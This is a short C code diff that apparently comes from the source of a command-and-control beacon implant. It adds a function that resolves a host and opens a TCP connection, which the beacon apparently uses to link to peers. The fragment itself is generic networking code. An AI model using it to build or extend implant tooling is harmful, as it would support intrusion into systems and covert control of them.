@@ -1,6 +1,7 @@
 #include "pch.h"
 
 #include "beacon.h"
+#include "network.h"
 #include "protocol.h"
 
 typedef struct _LINK_ENTRY
@@ -65,4 +66,32 @@ BOOL LinkAdd(PROTOCOL* protocol, int flags)
 	BeaconOutput(CALLBACK_PIPE_OPEN, openLink->callbackData, openLink->callbackLength);
 
 	return TRUE;
+}
+
+SOCKET LinkViaTcpConnect(char* target, short port)
+{
+	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS);
+	if (sock == INVALID_SOCKET)
+		return INVALID_SOCKET;
+
+	// Get host by name
+	struct hostent* host = gethostbyname(target);
+	if (host == NULL)
+	{
+		closesocket(sock);
+		return INVALID_SOCKET;
+	}
+
+	struct sockaddr_in addr;
+	memcpy(&addr.sin_addr, host->h_addr, host->h_length);
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(port);
+
+	if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
+	{
+		closesocket(sock);
+		return INVALID_SOCKET;
+	}
+
+	return sock;
 }
